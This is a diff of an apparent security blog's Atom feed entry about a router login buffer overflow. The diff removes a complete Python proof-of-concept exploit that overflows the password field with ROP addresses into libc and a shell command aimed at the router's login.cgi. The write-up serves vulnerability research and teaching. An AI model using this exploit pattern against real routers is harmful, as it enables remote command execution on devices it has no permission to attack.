@@ -114,7 +114,7 @@
     <link href="http://xdxd.love/2016/10/11/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
     <id>http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/</id>
     <published>2016-10-11T06:32:51.000Z</published>
-    <updated>2016-10-17T02:48:36.000Z</updated>
+    <updated>2016-10-18T06:25:18.000Z</updated>
     <content type="html"><![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
 <p><img src="/images/luyouqimips1.png" alt=""></p>
 <p>可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。</p>
@@ -192,59 +192,7 @@
 <p>由于libc.so.0是动态加载的，所以开始获取到的system地址是一个相对基址的偏移地址。需要获取libc.so.0动态库的基址为2ac81000。获取命令为：</p>
 <p><img src="/images/luyouqimips14.png" alt=""></p>
 <p>最终的exp如下：</p>
-<pre><code><span class="comment">#!/usr/bin/env python</span>
-<span class="comment"># encoding: utf-8</span>
-
-<span class="string">"""
-@version: 0.01
-@author: xdxd
-@license: Apache Licence 
-@contact: 646901834@qq.com
-@site: http://www.xdxd.love
-@software: PyCharm
-@file: mipsexp.py.py
-@time: 16/10/13 上午10:48
-"""</span>
-<span class="keyword">import</span> sys
-<span class="keyword">import</span> time
-<span class="keyword">import</span> string
-<span class="keyword">import</span> socket
-<span class="keyword">from</span> random <span class="keyword">import</span> Random
-<span class="keyword">import</span> urllib, urllib2, httplib
-<span class="keyword">import</span> json,struct
-<span class="keyword">import</span> requests
-
-<span class="function"><span class="keyword">def</span> <span class="title">makenop</span><span class="params">(length)</span>:</span>
-    <span class="keyword">return</span> <span class="string">'B'</span> * length
-
-<span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(rop, cmd)</span>:</span>
-    payload = makenop(<span class="number">237</span>)
-    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">1</span>])
-    payload += makenop(<span class="number">8</span>)
-    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">0</span>])  <span class="comment"># eip</span>
-    payload += makenop(<span class="number">0x18</span>)
-    payload += cmd
-    payload += <span class="string">"||"</span>
-    open(<span class="string">'shellcode'</span>, <span class="string">'wb'</span>).write(payload)
-    <span class="keyword">return</span> payload
-<span class="function"><span class="keyword">def</span> <span class="title">requestsbody</span><span class="params">(url,palyload)</span>:</span>
-    proxies = {
-        <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
-        <span class="string">'https'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
-    }
-    requests.post(url,data=payload,proxies=proxies)
-
-<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
-    cmd = <span class="string">"echo testxdxd &gt; /tmp/expxdxd"</span>
-    <span class="comment"># cmd ="ls"</span>
-    url = <span class="string">"http://192.168.7.1/login.cgi"</span>
-
-    libso = <span class="number">0x2ac81000</span>
-    rop = [libso + <span class="number">0x257A0</span>, libso + <span class="number">0x4c7E0</span>]
-    <span class="keyword">print</span> hex(rop[<span class="number">0</span>]), hex(rop[<span class="number">1</span>])
-    payload = {<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'userpwd'</span>:makepayload(rop,cmd)}
-    requestsbody(url,payload)
-</code></pre><p><img src="/images/luyouqimips15.png" alt=""></p>
+<p><img src="/images/luyouqimips15.png" alt=""></p>
 ]]></content>
     <summary type="html">
     <![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
